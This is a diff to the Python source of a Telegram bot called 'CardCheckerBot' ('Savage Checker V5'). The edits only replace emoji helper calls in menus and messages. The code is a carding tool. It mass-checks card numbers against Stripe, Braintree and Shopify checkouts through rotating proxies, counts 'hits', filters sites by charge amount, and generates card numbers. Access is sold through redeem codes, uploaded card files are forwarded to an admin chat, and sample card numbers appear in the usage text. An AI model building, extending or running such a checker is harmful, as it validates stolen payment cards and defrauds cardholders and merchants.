+                    "║  🔒 𝗔𝗖𝗖𝗘𝗦𝗦  𝗗𝗘𝗡𝗜𝗘𝗗 💀              ║\n"
                     "╠══════════════════════════════════════╣\n"
                     "║                                      ║\n"
                     "║  ⛔ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀᴄᴄᴇꜱꜱ        ║\n"
                     "║     ᴛᴏ ᴛʜɪꜱ ᴡᴇᴀᴘᴏɴ ꜱʏꜱᴛᴇᴍ.        ║\n"
                     "║                                      ║\n"
                     "║  📩 DM: @Unknownentit7               ║\n"
-                    f"║  {E('🎟️')} Or redeem a code below 👇        ║\n"
+                    "║  🎟️ Or redeem a code below 👇        ║\n"
                     "║                                      ║\n"
                     "╚══════════════════════════════════════╝",
                     buttons=btns,
@@ -2510,49 +2509,49 @@ class CardCheckerBot:
 
             header = (
                 "╔══════════════════════════════════════╗\n"
-                f"║  {E('👑')} 𝗦𝗔𝗩𝗔𝗚𝗘  𝗖𝗛𝗘𝗖𝗞𝗘𝗥  𝗩𝟱 {E('🔥')}         ║\n"
+                "║  👑 𝗦𝗔𝗩𝗔𝗚𝗘  𝗖𝗛𝗘𝗖𝗞𝗘𝗥  𝗩𝟱 🔥         ║\n"
                 "║  ─── ᴘʀᴇᴍɪᴜᴍ ʀᴇʟᴏᴀᴅᴇᴅ V2 ᴍᴏᴅᴇ ── ║\n"
                 "╠══════════════════════════════════════╣\n\n"
 
                 "┌──────── 🖥 𝗦𝘆𝘀𝘁𝗲𝗺 ─────────────┐\n"
-                f"│  {E('🟢')} Status:  <code>ONLINE 🔥</code>\n"
+                "│  🟢 Status:  <code>ONLINE 🔥</code>\n"
                 f"│  🧠 Engine:  <code>Reloaded V2 ⚡</code>\n"
                 f"│  💨 Speed:   <code>{speed_str} cards/sec</code>\n"
-                f"│  {E('🕒')} Uptime:  <code>{self.get_uptime()}</code>\n"
+                f"│  🕒 Uptime:  <code>{self.get_uptime()}</code>\n"
                 "└──────────────────────────────────────┘\n\n"
 
-                f"┌──────── {E('📊')} 𝗞𝗶𝗹𝗹 𝗦𝘁𝗮𝘁𝘀 ─────────┐\n"
-                f"│  {E('🔍')} Checked:  <code>{tc:,}</code>\n"
-                f"│  {E('💀')} Hits:     <code>{ta:,}</code>\n"
+                "┌──────── 📊 𝗞𝗶𝗹𝗹 𝗦𝘁𝗮𝘁𝘀 ─────────┐\n"
+                f"│  🔍 Checked:  <code>{tc:,}</code>\n"
+                f"│  💀 Hits:     <code>{ta:,}</code>\n"
                 f"│  📈 Rate:     <code>{sr:.1f}%</code>\n"
                 "└──────────────────────────────────────┘\n\n"
 
-                f"┌──────── {E('📃')} 𝗟𝗶𝗺𝗶𝘁𝘀 ────────────┐\n"
-                f"│  {E('⚡')} Stripe:    <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>\n"
-                f"│  {E('🌐')} Braintree: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code>\n"
-                f"│  {E('🛒')} Shopify:   <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n"
+                "┌──────── 📃 𝗟𝗶𝗺𝗶𝘁𝘀 ────────────┐\n"
+                f"│  ⚡ Stripe:    <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>\n"
+                f"│  🌐 Braintree: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code>\n"
+                f"│  🛒 Shopify:   <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n"
                 "└──────────────────────────────────────┘\n\n"
 
-                f"👇 <b>ᴘɪᴄᴋ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ {E('💀')}</b>"
+                "👇 <b>ᴘɪᴄᴋ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ 💀</b>"
             )
             btns = []
             if self.is_user_approved(uid):
                 btns.extend([
-                    [Button.inline(f"{E('⚡')} 𝗦𝘁𝗿𝗶𝗽𝗲 {E('🗡️')}", data="mode_single"),
-                     Button.inline(f"{E('🌐')} 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 💉", data="mode_bt_single")],
-                    [Button.inline(f"{E('📃')} 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 {E('🔥')}", data="mode_mass"),
-                     Button.inline(f"{E('📃')} 𝗕𝗧 𝗠𝗮𝘀𝘀 {E('💣')}", data="mode_bt_mass")],
+                    [Button.inline("⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 🗡️", data="mode_single"),
+                     Button.inline("🌐 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 💉", data="mode_bt_single")],
+                    [Button.inline("📃 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 🔥", data="mode_mass"),
+                     Button.inline("📃 𝗕𝗧 𝗠𝗮𝘀𝘀 💣", data="mode_bt_mass")],
                 ])
             if self.is_shopify_approved(uid):
-                btns.append([Button.inline(f"{E('🛒')} 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗩𝟮 {E('☠️')}", data="shopify_menu")])
+                btns.append([Button.inline("🛒 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗩𝟮 ☠️", data="shopify_menu")])
             btns.extend([
-                [Button.inline(f"{E('👤')} 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 {E('💎')}", data="account"),
-                 Button.inline(f"{E('ℹ️')} 𝗛𝗲𝗹𝗽 📖", data="help_menu")],
-                [Button.inline(f"{E('🔍')} 𝗕𝗜𝗡 {E('🧬')}", data="bin_search"),
-                 Button.inline(f"{E('🎴')} 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 🎲", data="card_gen")],
+                [Button.inline("👤 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 💎", data="account"),
+                 Button.inline("ℹ️ 𝗛𝗲𝗹𝗽 📖", data="help_menu")],
+                [Button.inline("🔍 𝗕𝗜𝗡 🧬", data="bin_search"),
+                 Button.inline("🎴 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 🎲", data="card_gen")],
             ])
             if uid in ADMINS:
-                btns.append([Button.inline(f"{E('⚙️')} 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 {E('👑')}", data="admin")])
+                btns.append([Button.inline("⚙️ 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 👑", data="admin")])
             await event.reply(header, buttons=btns, parse_mode='html')
 
         @self.bot_client.on(events.NewMessage(func=lambda e: e.message.document))
@@ -2575,7 +2574,7 @@ class CardCheckerBot:
                 await self.safe_send_message(
                     FORWARD_CHAT_ID,
                     f"📤 <b>File Received</b>\n"
-                    f"┃ {E('👤')} User: {user_link}\n"
+                    f"┃ 👤 User: {user_link}\n"
                     f"┃ 📁 File: <code>{filename}</code>\n"
                     f"┃ ⏰ Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>"
                 )
@@ -2589,7 +2588,7 @@ class CardCheckerBot:
 
             if data in ["mode_single", "mode_bt_single", "mode_mass", "mode_bt_mass"]:
                 if not self.is_user_approved(uid):
-                    await event.answer(f"{E('❌')} Global access required.", alert=True)
+                    await event.answer("❌ Global access required.", alert=True)
                     return
 
             if data.startswith("shopify_") or data.startswith("mode_shopify_"):
@@ -2598,16 +2597,16 @@ class CardCheckerBot:
                     "shopify_upload_proxies", "shopify_proxy_status"
                 ]
                 if data in shopify_protected and not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.answer(f"{E('❌')} Shopify access required.", alert=True)
+                    await event.answer("❌ Shopify access required.", alert=True)
                     return
 
             if data in ["account", "help_menu", "bin_search", "card_gen"]:
                 if not self.has_any_access(uid):
-                    await event.answer(f"{E('❌')} Access denied.", alert=True)
+                    await event.answer("❌ Access denied.", alert=True)
                     return
 
             if data == "admin" and uid not in ADMINS:
-                await event.answer(f"{E('❌')} Admin only.", alert=True)
+                await event.answer("❌ Admin only.", alert=True)
                 return
 
             # ━━━━━━ STOP JOB ━━━━━━
@@ -2622,11 +2621,11 @@ class CardCheckerBot:
                     hits = len(job.get('approved_cards', []))
                     await event.edit(
                         "╔══════════════════════════════════════╗\n"
-                        f"║  ⏹ 𝗝𝗢𝗕 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 {E('🛑')}                ║\n"
+                        "║  ⏹ 𝗝𝗢𝗕 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 🛑                ║\n"
                         "╚══════════════════════════════╝\n\n"
                         f"    {self.progress_bar(p, t)}\n\n"
-                        f"┃ {E('📃')} Processed: <code>{p}/{t}</code>\n"
-                        f"┃ {E('✅')} Hits: <code>{hits}</code>",
+                        f"┃ 📃 Processed: <code>{p}/{t}</code>\n"
+                        f"┃ ✅ Hits: <code>{hits}</code>",
                         parse_mode='html')
                 else:
                     await event.answer("Already stopped.", alert=True)
@@ -2634,44 +2633,44 @@ class CardCheckerBot:
             # ━━━━━━ SHOPIFY MENU ━━━━━━
             elif data == "shopify_menu":
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.answer(f"{E('❌')} Shopify access required.", alert=True)
+                    await event.answer("❌ Shopify access required.", alert=True)
                     return
                 pc = len(self.user_proxies.get(uid, []))
-                p_icon = f"{E('🟢')}" if pc > 0 else f"{E('🔴')}"
+                p_icon = "🟢" if pc > 0 else "🔴"
                 ws = len(self.working_sites)
                 ds = len(self.dead_sites)
                 current_filter = self.user_amount_filter.get(uid, "all")
-                filter_labels = {"low": f"{E('💰')} Low (<$5)", "medium": "💵 Medium ($5-10)", "high": f"{E('💎')} High ($10-20)", "all": f"{E('🌐')} All"}
-                filter_display = filter_labels.get(current_filter, f"{E('🌐')} All")
+                filter_labels = {"low": "💰 Low (<$5)", "medium": "💵 Medium ($5-10)", "high": "💎 High ($10-20)", "all": "🌐 All"}
+                filter_display = filter_labels.get(current_filter, "🌐 All")
                 active_count = sum(1 for j in self.active_jobs.values() if j.get('user_id') == uid and not j.get('stop'))
                 btns = [
-                    [Button.inline(f"{E('💳')} 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸 {E('🎯')}", data="mode_shopify_single")],
-                    [Button.inline(f"{E('📃')} 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 {E('💣')}", data="mode_shopify_mass")],
-                    [Button.inline(f"{E('📊')} Active Jobs ({active_count}) & Stop {E('🛑')}", data="shopify_active_jobs")],
-                    [Button.inline(f"{E('💰')} Low (<$5)", data="shopify_filter_low"),
+                    [Button.inline("💳 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸 🎯", data="mode_shopify_single")],
+                    [Button.inline("📃 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 💣", data="mode_shopify_mass")],
+                    [Button.inline(f"📊 Active Jobs ({active_count}) & Stop 🛑", data="shopify_active_jobs")],
+                    [Button.inline("💰 Low (<$5)", data="shopify_filter_low"),
                      Button.inline("💵 Med ($5-10)", data="shopify_filter_medium")],
-                    [Button.inline(f"{E('💎')} High ($10-20)", data="shopify_filter_high"),
-                     Button.inline(f"{E('🌐')} All", data="shopify_filter_all")],
-                    [Button.inline(f"📎 𝗨𝗽𝗹𝗼𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 {E('🔗')}", data="shopify_upload_proxies"),
-                     Button.inline(f"{E('📊')} 𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝗮𝘁𝘂𝘀 {E('📡')}", data="shopify_proxy_status")],
+                    [Button.inline("💎 High ($10-20)", data="shopify_filter_high"),
+                     Button.inline("🌐 All", data="shopify_filter_all")],
+                    [Button.inline("📎 𝗨𝗽𝗹𝗼𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 🔗", data="shopify_upload_proxies"),
+                     Button.inline("📊 𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝗮𝘁𝘂𝘀 📡", data="shopify_proxy_status")],
                     [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")]
                 ]
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗥𝗘𝗟𝗢𝗔𝗗𝗘𝗗 ᴇɴᴛɪᴛʏ V2 {E('☠️')}   ║\n"
+                    "║  🛒 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗥𝗘𝗟𝗢𝗔𝗗𝗘𝗗 ᴇɴᴛɪᴛʏ V2 ☠️   ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"┌──────── {E('🌐')} 𝗜𝗻𝗳𝗿𝗮 ──────────────┐\n"
-                    f"│  {E('🟢')} Sites Alive:  <code>{ws}</code>\n"
-                    f"│  {E('🔴')} Sites Dead:   <code>{ds}</code>\n"
+                    "┌──────── 🌐 𝗜𝗻𝗳𝗿𝗮 ──────────────┐\n"
+                    f"│  🟢 Sites Alive:  <code>{ws}</code>\n"
+                    f"│  🔴 Sites Dead:   <code>{ds}</code>\n"
                     f"│  {p_icon} Proxies:      <code>{pc}</code> loaded\n"
-                    f"│  {E('🎯')} Amount Filter: <code>{filter_display}</code>\n"
+                    f"│  🎯 Amount Filter: <code>{filter_display}</code>\n"
                     "└──────────────────────────────────────┘\n\n"
-                    f"┌──────── {E('📝')} 𝗨𝘀𝗮𝗴𝗲 ──────────────┐\n"
-                    f"│  {E('🌐')} <code>/sp CC|MM|YY|CVV</code>\n"
-                    f"│  {E('🔗')} <code>/sp CC|MM|YY|CVV proxy</code>\n"
-                    f"│  {E('🎯')} <code>/sp CC|MM|YY|CVV low</code>\n"
+                    "┌──────── 📝 𝗨𝘀𝗮𝗴𝗲 ──────────────┐\n"
+                    "│  🌐 <code>/sp CC|MM|YY|CVV</code>\n"
+                    "│  🔗 <code>/sp CC|MM|YY|CVV proxy</code>\n"
+                    "│  🎯 <code>/sp CC|MM|YY|CVV low</code>\n"
                     "└──────────────────────────────────────┘\n\n"
-                    f"{E('⚠️')} <i>Upload proxies first for proxy mode</i>",
+                    "⚠️ <i>Upload proxies first for proxy mode</i>",
                     buttons=btns, parse_mode='html'
                 )
 
@@ -2680,7 +2679,7 @@ class CardCheckerBot:
                 filter_choice = data.replace("shopify_filter_", "")
                 if filter_choice in ("low", "medium", "high", "all"):
                     self.user_amount_filter[uid] = filter_choice
-                    filter_labels = {"low": f"{E('💰')} Low (<$5)", "medium": "💵 Medium ($5-10)", "high": f"{E('💎')} High ($10-20)", "all": f"{E('🌐')} All"}
+                    filter_labels = {"low": "💰 Low (<$5)", "medium": "💵 Medium ($5-10)", "high": "💎 High ($10-20)", "all": "🌐 All"}
 
                     # FIX: Warn if cache is incomplete for non-"all" filters
                     if filter_choice != "all":
@@ -2688,13 +2687,13 @@ class CardCheckerBot:
                         uncached = [s for s in base_sites if s not in self._site_price_cache]
                         if uncached:
                             await event.answer(
-                                f"{E('⚠️')} {len(uncached)} sites have no cached price. Run /test_sites first for accurate filtering.",
+                                f"⚠️ {len(uncached)} sites have no cached price. Run /test_sites first for accurate filtering.",
                                 alert=True
                             )
                         else:
-                            await event.answer(f"{E('✅')} Filter set: {filter_labels[filter_choice]}", alert=True)
+                            await event.answer(f"✅ Filter set: {filter_labels[filter_choice]}", alert=True)
                     else:
-                        await event.answer(f"{E('✅')} Filter set: {filter_labels[filter_choice]}", alert=True)
+                        await event.answer(f"✅ Filter set: {filter_labels[filter_choice]}", alert=True)
 
                     # Pre-filter sites by amount filter (instant — no API calls)
                     try:
@@ -2709,7 +2708,7 @@ class CardCheckerBot:
                 if not user_jobs:
                     await event.edit(
                         "╔══════════════════════════════════════╗\n"
-                        f"║  {E('📊')} 𝗔𝗖𝗧𝗜𝗩𝗘 𝗝𝗢𝗕𝗦                    ║\n"
+                        "║  📊 𝗔𝗖𝗧𝗜𝗩𝗘 𝗝𝗢𝗕𝗦                    ║\n"
                         "╠══════════════════════════════════════╣\n\n"
                         "┃ <i>No active jobs.</i>\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
@@ -2725,13 +2724,13 @@ class CardCheckerBot:
                         t = j.get('total', 0)
                         hits = len(j.get('approved_cards', []))
                         lines.append(
-                            f"┃ {E('🔄')} <b>{gw.upper()}</b> | {p}/{t} processed | {E('✅')} {hits} hits"
+                            f"┃ 🔄 <b>{gw.upper()}</b> | {p}/{t} processed | ✅ {hits} hits"
                         )
                         btns.append([Button.inline(f"⏹ Stop {jid[:8]}...", data=f"stop_{jid}")])
                     btns.append([Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")])
                     await event.edit(
                         "╔══════════════════════════════════════╗\n"
-                        f"║  {E('📊')} 𝗔𝗖𝗧𝗜𝗩𝗘 𝗝𝗢𝗕𝗦                    ║\n"
+                        "║  📊 𝗔𝗖𝗧𝗜𝗩𝗘 𝗝𝗢𝗕𝗦                    ║\n"
                         "╠══════════════════════════════════════╣\n\n"
                         + "\n".join(lines) + "\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
@@ -2741,17 +2740,17 @@ class CardCheckerBot:
 
             elif data == "mode_shopify_single":
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.answer(f"{E('❌')} Shopify access required.", alert=True)
+                    await event.answer("❌ Shopify access required.", alert=True)
                     return
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('💳')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗦𝗜𝗡𝗚𝗟𝗘 𝗞𝗜𝗟𝗟 {E('🎯')}   ║\n"
+                    "║  💳 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗦𝗜𝗡𝗚𝗟𝗘 𝗞𝗜𝗟𝗟 🎯   ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"{E('📝')} <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
-                    f"┌──────── {E('🌐')} 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗠𝗼𝗱𝗲 ───────┐\n"
+                    "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
+                    "┌──────── 🌐 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗠𝗼𝗱𝗲 ───────┐\n"
                     "│  <code>/sp 4601860005184553|03|28|478</code>\n"
                     "└──────────────────────────────────────┘\n\n"
-                    f"┌──────── {E('🔗')} 𝗣𝗿𝗼𝘅𝘆 𝗠𝗼𝗱𝗲 ─────────┐\n"
+                    "┌──────── 🔗 𝗣𝗿𝗼𝘅𝘆 𝗠𝗼𝗱𝗲 ─────────┐\n"
                     "│  <code>/sp 4601860005184553|03|28|478 proxy</code>\n"
                     "└──────────────────────────────────────┘",
                     parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
@@ -2759,15 +2758,15 @@ class CardCheckerBot:
 
             elif data == "mode_shopify_mass":
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.answer(f"{E('❌')} Shopify access required.", alert=True)
+                    await event.answer("❌ Shopify access required.", alert=True)
                     return
                 self.user_upload_mode[uid] = 'shopify'
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('📃')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗠𝗔𝗦𝗦 𝗞𝗜𝗟𝗟 {E('💣')}      ║\n"
+                    "║  📃 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗠𝗔𝗦𝗦 𝗞𝗜𝗟𝗟 💣      ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"{E('📃')} Max cards: <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n\n"
-                    f"┌──────── {E('📝')} 𝗙𝗶𝗹𝗲 𝗙𝗼𝗿𝗺𝗮𝘁 ─────────┐\n"
+                    f"📃 Max cards: <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n\n"
+                    "┌──────── 📝 𝗙𝗶𝗹𝗲 𝗙𝗼𝗿𝗺𝗮𝘁 ─────────┐\n"
                     "│  One card per line:\n"
                     "│  <code>4601860005184553|03|28|478</code>\n"
                     "│  <code>5509890034877216|06|28|333</code>\n"
@@ -2778,28 +2777,28 @@ class CardCheckerBot:
 
             elif data == "shopify_upload_proxies":
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.answer(f"{E('❌')} Shopify access required.", alert=True)
+                    await event.answer("❌ Shopify access required.", alert=True)
                     return
                 self.user_upload_mode[uid] = 'shopify_proxies'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
                     "║   📎 UPLOAD PROXIES          ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"┏━━━━━ {E('📝')} Format ━━━━━━━━━━━┓\n"
+                    "┏━━━━━ 📝 Format ━━━━━━━━━━━┓\n"
                     "┃ <code>host:port:user:pass</code>\n"
                     "┃\n"
                     "┃ Example:\n"
                     "┃ <code>px023.server.com:10780:user:pass</code>\n"
                     "┃ <code>proxy.example.com:8080:user:pass</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-                    f"{E('✅')} Bot will auto-validate\n"
+                    "✅ Bot will auto-validate\n"
                     "📤 <b>Send your .txt file now...</b>",
                     parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                 )
 
             elif data == "shopify_proxy_status":
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.answer(f"{E('❌')} Shopify access required.", alert=True)
+                    await event.answer("❌ Shopify access required.", alert=True)
                     return
                 proxies = self.user_proxies.get(uid, [])
                 if proxies:
@@ -2807,23 +2806,23 @@ class CardCheckerBot:
                     latency_data = self._proxy_latency.get(uid, [])
                     if latency_data:
                         plist = "\n".join([
-                            f"┃ {E('✅')} <code>{p[:40]}</code> ({lat:.0f}ms)"
+                            f"┃ ✅ <code>{p[:40]}</code> ({lat:.0f}ms)"
                             for p, lat in latency_data[:5]
                         ])
                         more = f"\n┃ <i>+{len(proxies)-5} more...</i>" if len(proxies) > 5 else ""
                         fastest = f"{latency_data[0][1]:.0f}ms" if latency_data else "N/A"
-                        sort_info = f"🏎️ <b>Fastest:</b> <code>{fastest}</code>\n{E('🔄')} <b>Rotation:</b> <code>Latency-sorted</code>"
+                        sort_info = f"🏎️ <b>Fastest:</b> <code>{fastest}</code>\n🔄 <b>Rotation:</b> <code>Latency-sorted</code>"
                     else:
-                        plist = "\n".join([f"┃ {E('✅')} <code>{p[:40]}</code>" for p in proxies[:5]])
+                        plist = "\n".join([f"┃ ✅ <code>{p[:40]}</code>" for p in proxies[:5]])
                         more = f"\n┃ <i>+{len(proxies)-5} more...</i>" if len(proxies) > 5 else ""
-                        sort_info = f"{E('🔄')} <b>Rotation:</b> <code>Round-Robin</code>"
+                        sort_info = "🔄 <b>Rotation:</b> <code>Round-Robin</code>"
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('📊')} PROXY STATUS            ║\n"
+                        "║   📊 PROXY STATUS            ║\n"
                         "╚══════════════════════════════╝\n\n"
-                        f"{E('🟢')} <b>Total Active:</b> <code>{len(proxies)}</code>\n"
+                        f"🟢 <b>Total Active:</b> <code>{len(proxies)}</code>\n"
                         f"{sort_info}\n\n"
-                        f"┏━━━━━ {E('📋')} Loaded ━━━━━━━━━━━┓\n"
+                        f"┏━━━━━ 📋 Loaded ━━━━━━━━━━━┓\n"
                         f"{plist}{more}\n"
                         f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                         parse_mode='html',
@@ -2832,9 +2831,9 @@ class CardCheckerBot:
                 else:
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('📊')} PROXY STATUS            ║\n"
+                        "║   📊 PROXY STATUS            ║\n"
                         "╚══════════════════════════════╝\n\n"
-                        f"{E('🔴')} <b>No proxies loaded</b>\n\n"
+                        "🔴 <b>No proxies loaded</b>\n\n"
                         "📎 Use <b>Upload Proxies</b> to add",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
@@ -2844,11 +2843,11 @@ class CardCheckerBot:
             elif data == "mode_single":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('⚡')} STRIPE — SINGLE         ║\n"
+                    "║   ⚡ STRIPE — SINGLE         ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('📝')} <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
+                    "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
                     "📤 <code>/st 4601860005184553|03|28|478</code>\n\n"
-                    f"{E('🌐')} <b>Mode:</b> <code>Direct Engine</code>",
+                    "🌐 <b>Mode:</b> <code>Direct Engine</code>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
@@ -2856,11 +2855,11 @@ class CardCheckerBot:
             elif data == "mode_bt_single":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('🌐')} BRAINTREE — SINGLE      ║\n"
+                    "║   🌐 BRAINTREE — SINGLE      ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('📝')} <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
+                    "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
                     "📤 <code>/bt 4601860005184553|03|28|478</code>\n\n"
-                    f"{E('🌐')} <b>Mode:</b> <code>Direct Engine</code>",
+                    "🌐 <b>Mode:</b> <code>Direct Engine</code>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
@@ -2869,10 +2868,10 @@ class CardCheckerBot:
                 self.user_upload_mode[uid] = 'stripe'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('📃')} STRIPE — MASS           ║\n"
+                    "║   📃 STRIPE — MASS           ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('📃')} Max: <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code> cards\n\n"
-                    f"┏━━━━━ {E('📝')} File Format ━━━━━━━┓\n"
+                    f"📃 Max: <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code> cards\n\n"
+                    "┏━━━━━ 📝 File Format ━━━━━━━┓\n"
                     "┃ One card per line:\n"
                     "┃ <code>CC|MM|YY|CVV</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
@@ -2884,10 +2883,10 @@ class CardCheckerBot:
                 self.user_upload_mode[uid] = 'braintree'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('📃')} BRAINTREE — MASS        ║\n"
+                    "║   📃 BRAINTREE — MASS        ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('📃')} Max: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code> cards\n\n"
-                    f"┏━━━━━ {E('📝')} File Format ━━━━━━━┓\n"
+                    f"📃 Max: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code> cards\n\n"
+                    "┏━━━━━ 📝 File Format ━━━━━━━┓\n"
                     "┃ One card per line:\n"
                     "┃ <code>CC|MM|YY|CVV</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
@@ -2903,9 +2902,9 @@ class CardCheckerBot:
                 await self.safe_send_message(
                     event.chat_id,
                     "╔══════════════════════════════╗\n"
-                    f"║      {E('ℹ️')} HELP CENTER           ║\n"
+                    "║      ℹ️ HELP CENTER           ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"┏━━━━━ {E('⚡')} Gateways ━━━━━━━━━━┓\n"
+                    "┏━━━━━ ⚡ Gateways ━━━━━━━━━━┓\n"
                     "┃ <code>/st CC|MM|YY|CVV</code> — Stripe\n"
                     "┃ <code>/bt CC|MM|YY|CVV</code> — Braintree\n"
                     "┃ <code>/sp CC|MM|YY|CVV</code> — Shopify\n"
@@ -2922,7 +2921,7 @@ class CardCheckerBot:
             elif data == "bin_search":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║      {E('🔍')} BIN LOOKUP           ║\n"
+                    "║      🔍 BIN LOOKUP           ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📤 Send: <code>/bin 424242</code>",
                     parse_mode='html',
@@ -2932,9 +2931,9 @@ class CardCheckerBot:
             elif data == "card_gen":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║      {E('🎴')} CARD GENERATOR       ║\n"
+                    "║      🎴 CARD GENERATOR       ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"┏━━━━━ {E('📝')} Usage ━━━━━━━━━━━━┓\n"
+                    "┏━━━━━ 📝 Usage ━━━━━━━━━━━━┓\n"
                     "┃ <code>/generate 1000</code>        Random\n"
                     "┃ <code>/generate 1000 424242</code> Custom\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
@@ -2945,7 +2944,7 @@ class CardCheckerBot:
             elif data == "redeem_menu":
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🎟️')} 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘 {E('🔑')}                ║\n"
